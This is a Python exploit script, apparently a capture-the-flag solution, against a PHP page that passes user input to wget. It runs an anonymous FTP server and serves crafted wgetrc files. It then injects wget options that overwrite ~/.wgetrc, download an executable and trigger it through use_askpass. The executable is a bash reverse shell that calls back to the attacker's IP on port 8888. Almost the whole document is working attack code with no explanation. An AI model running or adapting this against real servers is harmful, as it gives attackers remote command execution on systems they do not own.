#!/usr/bin/env python3

import threading
import time
import requests
import sys
import os
from pyftpdlib import servers
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.authorizers import DummyAuthorizer

if len(sys.argv) != 2:
    print('Usage: exploit.py <listen-ip>')
    exit()

def start_ftp_server():
    ftpdata = './ftpdata/'
    if not os.path.exists(ftpdata):
        os.mkdir(ftpdata)

    authorizer = DummyAuthorizer()
    authorizer.add_anonymous('./ftpdata/')

    handler = FTPHandler
    handler.authorizer = authorizer

    address = ("0.0.0.0", 21)
    server = servers.ThreadedFTPServer(address, handler)
    server.serve_forever()

def prepare_ftp_data(ip):
    ftpdata = './ftpdata/'

    # preapre files for step1: download wgetrc to ~/.wgetrc
    with open(ftpdata + 'wgetrc1', 'w') as f:
        f.write('input=urls1.txt\n')
        f.write('output_document=~/.wgetrc')
    with open(ftpdata + 'urls1.txt', 'w') as f:
        f.write(f'ftp://{ip}/wgetrc2\n')

    # preapre files for step2: download pwn executable
    with open(ftpdata + 'wgetrc2', 'w') as f:
        f.write('input=urls2.txt')
    with open(ftpdata + 'urls2.txt', 'w') as f:
        f.write(f'ftp://{ip}/pwn')
    with open(ftpdata + 'pwn', 'w') as f:
        f.write(f'#!/bin/bash\n')
        #f.write(f'id > /tmp/pwn.txt')
        f.write(f'bash -c "bash -i < /dev/tcp/{ip}/8888 1<&0 2<&0"')
    os.chmod(ftpdata + 'pwn', 0o755)

    # preapre files for step3: download wgetrc to ~/.wgetrc which contains "use_askpass" command
    with open(ftpdata + 'wgetrc3', 'w') as f:
        f.write('input=urls3.txt\n')
        f.write('output_document=~/.wgetrc')
    with open(ftpdata + 'urls3.txt', 'w') as f:
        f.write(f'ftp://{ip}/wgetrc4\n')
    with open(ftpdata + 'wgetrc4', 'w') as f:
        f.write('use_askpass=./pwn')

def request(session, url, data):
    data = { 'url': data }
    session.post(url, data=data)

t = threading.Thread(target=start_ftp_server)
t.start()
time.sleep(2)

url = 'http://<challenge_ip>/wget.php'

ip = sys.argv[1]

prepare_ftp_data(ip)

session = requests.Session()

# prepare all files
request(session, url, f'ftp://{ip}/wgetrc1')
request(session, url, f'ftp://{ip}/urls1.txt')
request(session, url, f'ftp://{ip}/urls2.txt')
request(session, url, f'ftp://{ip}/wgetrc3')
request(session, url, f'ftp://{ip}/urls3.txt')

# step1: download wgetrc to ~/.wgetrc
request(session, url, f'--config=wgetrc1')

# step2: download pwn executable
request(session, url, f'--preserve-permission')

# step3: download wgetrc to ~/.wgetrc which contains "use_askpass" command
request(session, url, f'--config=wgetrc3')

# step4: trigger askpass to getshell
request(session, url, f'0')
